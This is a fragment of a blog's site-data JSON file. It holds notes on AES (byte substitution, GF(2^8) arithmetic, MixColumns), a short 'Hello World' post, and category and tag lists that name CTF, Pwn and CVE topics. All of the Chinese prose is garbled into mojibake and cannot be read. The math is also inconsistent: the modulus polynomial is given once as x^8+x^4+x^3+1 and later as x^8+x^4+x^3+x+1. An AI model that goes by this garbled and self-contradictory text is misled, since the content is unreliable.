å­—èŠ‚æ›¿æ¢åœ¨å­—èŠ‚æ›¿æ¢çš„èƒŒåï¼Œå…¶å®æ˜¯æœ‰å¯¹åº”çš„æ•°å­¦è§„åˆ™æ¥å®šä¹‰å¯¹åº”çš„æ›¿æ¢è¡¨çš„ï¼Œå¦‚ä¸‹ è¿™é‡Œçš„è¿ç®—å‡å®šä¹‰GF(2^8)å†…åˆ—æ··æ·† è¿™é‡Œçš„è¿ç®—ä¹Ÿæ˜¯å®šä¹‰åœ¨ GF(2^8) ä¸Šï¼Œä½¿ç”¨çš„æ¨¡å¤šé¡¹å¼ä¸º x^8+x^4+x^3+1ã€‚å¯†é’¥æ‰©å±• ç­‰ä»·è§£å¯†ç®—æ³•ç®€å•åˆ†æä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° äº¤æ¢é€†å‘è¡Œç§»ä½å’Œé€†å‘å­—èŠ‚ä»£æ›¿å¹¶ä¸å½±å“ç»“æœã€‚ äº¤æ¢è½®å¯†é’¥åŠ å’Œé€†å‘åˆ—æ··æ·†å¹¶ä¸å½±å“ç»“æœï¼Œå…³é”®åœ¨äº é¦–å…ˆå¯ä»¥æŠŠå¼‚æˆ–çœ‹æˆåŸŸä¸Šçš„å¤šé¡¹å¼åŠ æ³• ç„¶åå¤šé¡¹å¼ä¸­ä¹˜æ³•å¯¹åŠ æ³•å…·æœ‰åˆ†é…ç‡ã€‚ GF(2^8)ä¸Šçš„å››åˆ™è¿ç®—åŠ å‡æ³•ï¼š åœ¨GF(2^8)ä¸Šçš„åŠ æ³•å®šä¹‰ä¸ºäºŒè¿›åˆ¶å¤šé¡¹å¼åŠ æ³•ï¼Œä¸”å…¶ç³»æ•°æ¨¡2Demo: 57+83=D4 (x^6+x^4+x^2+x+1)+(x^7+x+1)=x^7+x^6+ x^4+ x^2 (mod m(x))ä¹˜é™¤æ³•ï¼š åœ¨GF(2^8)ä¸­å®šä¹‰çš„äºŒè¿›åˆ¶ä¹˜ç§¯æ¨¡ä¸€ä¸ªæ¬¡æ•°ä¸º8çš„ä¸å¯çº¦å¤šé¡¹å¼ m(x)= x^8+x^4+x^3+x+1Demo: 57*83=C1 (x^6+x^4+x^2+x+1)Â·(x^7+x+1)=x^7+x^6+1(mod m(x))åˆ—æ··åˆï¼š åˆ—æ··åˆæ“ä½œç­‰ä»·äºä»¥ä¸‹çŸ©é˜µä¹˜æ³•ï¼š b3â€‹x3+b2â€‹x2+b1â€‹x+b0â€‹=(a3â€‹x3+a2â€‹x2+a1â€‹x+a0â€‹)({03}x3+{01}x2+{01}x+{02}) =(a3â€‹âˆ—03)x6+(a3â€‹âˆ—01+a2â€‹âˆ—03)x5+(a3â€‹âˆ—01+a2â€‹âˆ—01+a1â€‹âˆ—03)x4+(a3â€‹âˆ—02+a2â€‹âˆ—01+a1â€‹âˆ—01+a0â€‹âˆ—03)x3+(a2â€‹âˆ—02+a1â€‹âˆ—01+a0â€‹âˆ—01)x2+(a1â€‹âˆ—02+a0â€‹âˆ—01)x+a0â€‹âˆ—02 =(a3â€‹âˆ—02+a2â€‹âˆ—01+a1â€‹âˆ—01+a0â€‹âˆ—03)x3+(a3â€‹âˆ—03+a2â€‹âˆ—02+a1â€‹âˆ—01+a0â€‹âˆ—01)x2+(a3â€‹âˆ—01+a2â€‹âˆ—03+a1â€‹âˆ—02+a0â€‹âˆ—01)x+(a3â€‹âˆ—01+a2â€‹âˆ—01+a1â€‹âˆ—03+a0â€‹âˆ—02)æœ€ç»ˆå†™ä¸ºçŸ©é˜µå½¢å¼å³å¦‚ä¸Šå›¾","categories":[{"name":"cryptography","slug":"cryptography","permalink":"http://example.com/categories/cryptography/"}],"tags":[{"name":"AES","slug":"AES","permalink":"http://example.com/tags/AES/"}]},{"title":"Hello World","slug":"hello_world","date":"2021-03-25T17:19:47.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/03/26/hello_world/","link":"","permalink":"http://example.com/2021/03/26/hello_world/","excerpt":"","text":"ä¸€ä¸ªæ–°çš„å¼€å§‹ â€œæˆ‘æ‰€æœ‰çš„æ¬²æœ›å’Œæ²‰æ€ï¼Œéƒ½æ˜¯è¿™ä¸ªå®‡å®™ç¼“ç¼“å‘¼å‡ºçš„æ°”æµã€‚åœ¨è¿™æ¼«é•¿çš„å‘¼æ°”ç»“æŸä¹‹å‰ï¼Œæˆ‘çš„æ€ç»´å°†ä¸€ç›´å­˜åœ¨ã€‚â€ â€‹ å‡ ç»å‘¨æŠ˜ç»ˆäºé¢å‰æ­å»ºå¥½äº†å±äºè‡ªå·±çš„åšå®¢ï¼Œä¸€ä¸ªå±äºè‡ªå·±çš„ç©ºé—´ã€‚é•¿ä¹…ä»¥æ¥ï¼Œæˆ‘ä¸å¤–ç•Œçš„å…³ç³»æ˜¯ä½œä¸ºä¸€ä¸ªæ¶ˆè´¹è€…ï¼Œæ¶ˆè´¹ç‰©è´¨å’Œå†…å®¹ã€‚2021å¹´å¸Œæœ›è‡ªå·±å¯ä»¥åšä¸€ä¸ªç”Ÿäº§è€…ï¼Œåˆ›ä½œè€…ï¼ŒæŠŠåšå®¢ä½œä¸ºæ–¹æ³•ï¼Œè¾“å‡ºå’Œè®°å½•ä¸€äº›å†…å®¹ã€‚ :) Hello world.","categories":[{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}],"categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"},{"name":"Web","slug":"Web","permalink":"http://example.com/categories/Web/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"},{"name":"Python","slug":"Python","permalink":"http://example.com/categories/Python/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"},{"name":"cryptography","slug":"cryptography","permalink":"http://example.com/categories/cryptography/"},{"name":"cryptographyã€é€†å‘","slug":"cryptographyã€é€†å‘","permalink":"http://example.com/categories/cryptography%E3%80%81%E9%80%86%E5%90%91/"},{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"FormatString","slug":"FormatString","permalink":"http://example.com/tags/FormatString/"},{"name":"Rop","slug":"Rop","permalink":"http://example.com/tags/Rop/"},{"name":"ELFæ–‡ä»¶","slug":"ELFæ–‡ä»¶","permalink":"http://example.com/tags/ELF%E6%96%87%E4%BB%B6/"},{"name":"Web","slug":"Web","permalink":"http://example.com/tags/Web/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"PEæ–‡ä»¶","slug":"PEæ–‡ä»¶","permalink":"http://example.com/tags/PE%E6%96%87%E4%BB%B6/"},{"name":"ç¼–è¯‘è¿‡ç¨‹","slug":"ç¼–è¯‘è¿‡ç¨‹","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"é“¾æ¥","slug":"é“¾æ¥","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"ç¨‹åºä¿æŠ¤æœºåˆ¶","slug":"ç¨‹åºä¿æŠ¤æœºåˆ¶","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"name":"å †æº¢å‡º","slug":"å †æº¢å‡º","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-21220","slug":"CVE-2021-21220","permalink":"http://example.com/tags/CVE-2021-21220/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"},{"name":"MITM","slug":"MITM","permalink":"http://example.com/tags/MITM/"},{"name":"triple-DES","slug":"triple-DES","permalink":"http://example.com/tags/triple-DES/"},{"name":"double-DES","slug":"double-DES","permalink":"http://example.com/tags/double-DES/"},{"name":"æµå¯†ç ","slug":"æµå¯†ç ","permalink":"http://example.com/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"},{"name":"DESã€IDAé€†å‘","slug":"DESã€IDAé€†å‘","permalink":"http://example.com/tags/DES%E3%80%81IDA%E9%80%86%E5%90%91/"},{"name":"AES","slug":"AES","permalink":"http://example.com/tags/AES/"},{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}